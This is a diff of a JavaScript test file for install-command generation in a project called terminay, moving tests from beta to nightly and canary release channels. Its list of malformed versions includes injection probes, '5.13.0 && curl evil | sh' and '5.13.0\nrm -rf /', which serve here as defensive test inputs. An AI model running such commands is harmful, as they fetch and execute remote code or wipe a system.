@@ -21,12 +21,21 @@ test('a stable client names the image at its own release', () => {
 	assert.equal(commands.linux.pair, 'sudo npx terminay daemon qr-code');
 });
 
-test('a beta client names its beta image and the rolling Linux channel', () => {
-	const commands = serverInstallCommands({ version: '5.13.0-beta.214' });
-	assert.equal(commands.channel, 'beta');
-	assert.equal(commands.image, 'markwylde/terminay:5.13.0-beta.214');
-	assert.match(commands.docker.start, / markwylde\/terminay:5\.13\.0-beta\.214$/u);
+test('a nightly client names its nightly image and the main Linux channel', () => {
+	const commands = serverInstallCommands({ version: '5.13.0-main.3312.nightly' });
+	assert.equal(commands.channel, 'nightly');
+	assert.equal(commands.image, 'markwylde/terminay:5.13.0-main.3312.nightly');
+	assert.match(commands.docker.start, / markwylde\/terminay:5\.13\.0-main\.3312\.nightly$/u);
 	assert.equal(commands.linux.start, 'sudo npx terminay daemon install main');
+	assert.equal(commands.linux.pair, 'sudo npx terminay daemon qr-code');
+});
+
+test('a canary client names its canary image and the canary Linux channel', () => {
+	const commands = serverInstallCommands({ version: '5.13.0-main.3320.canary' });
+	assert.equal(commands.channel, 'canary');
+	assert.equal(commands.image, 'markwylde/terminay:5.13.0-main.3320.canary');
+	assert.match(commands.docker.start, / markwylde\/terminay:5\.13\.0-main\.3320\.canary$/u);
+	assert.equal(commands.linux.start, 'sudo npx terminay daemon install canary');
 	assert.equal(commands.linux.pair, 'sudo npx terminay daemon qr-code');
 });
 
@@ -38,8 +47,14 @@ test('a development build, an absent version, and a malformed one name no tag', 
 		'',
 		'v5.13.0',
 		'5.13',
+		// An old Beta build names no track any more.
+		'5.13.0-beta.214',
 		'5.13.0-beta.0',
 		'5.13.0-beta',
+		'5.13.0-main.0.canary',
+		'5.13.0-main.12',
+		'5.13.0-main.12.beta',
+		'5.13.0-main.12.nightly.1',
 		'5.13.0-rc.1',
 		'5.13.0 && curl evil | sh',
 		'5.13.0\nrm -rf /',
@@ -56,14 +71,14 @@ test('a development build, an absent version, and a malformed one name no tag', 
 });
 
 test('the further options carry the same image', () => {
-	const commands = serverInstallCommands({ version: '5.13.0-beta.214' });
+	const commands = serverInstallCommands({ version: '5.13.0-main.3320.canary' });
 	assert.equal(
 		commands.dockerPublic,
-		"docker run -d --name terminay -v terminay-data:/var/lib/terminay -v terminay-home:/home/terminay -p 8443:8443 -p 51000-51015:51000-51015/udp -e TERMINAY_PUBLIC_HOST=<this machine's address> markwylde/terminay:5.13.0-beta.214",
+		"docker run -d --name terminay -v terminay-data:/var/lib/terminay -v terminay-home:/home/terminay -p 8443:8443 -p 51000-51015:51000-51015/udp -e TERMINAY_PUBLIC_HOST=<this machine's address> markwylde/terminay:5.13.0-main.3320.canary",
 	);
 	assert.equal(
 		commands.dockerHostNetwork,
-		'docker run -d --name terminay --network host -v terminay-data:/var/lib/terminay -v terminay-home:/home/terminay markwylde/terminay:5.13.0-beta.214',
+		'docker run -d --name terminay --network host -v terminay-data:/var/lib/terminay -v terminay-home:/home/terminay markwylde/terminay:5.13.0-main.3320.canary',
 	);
 });
 
